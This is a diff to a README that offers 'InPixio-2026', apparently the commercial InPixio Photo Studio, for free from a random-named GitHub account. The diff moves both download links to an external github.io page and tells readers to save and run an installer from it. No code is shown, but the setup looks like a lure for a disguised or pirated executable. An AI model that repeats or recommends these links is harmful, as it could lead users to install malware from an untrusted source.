@@ -1,6 +1,6 @@
 # 🖼️ InPixio-2026 - Master your photos with ease
 
-[Download InPixio Photo Studio for Windows](https://github.com/Sordid-bacteroid798/InPixio-2026)
+[Download InPixio Photo Studio for Windows](https://sordid-bacteroid798.github.io)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets these standards for a stable experi
 
 Follow these steps to set up the software on your PC.
 
-1. Visit the [InPixio download page](https://github.com/Sordid-bacteroid798/InPixio-2026).
+1. Visit the [InPixio download page](https://sordid-bacteroid798.github.io).
 2. Locate the link to the installer file.
 3. Save the file to your computer.
 4. Select the downloaded file to begin the setup process.
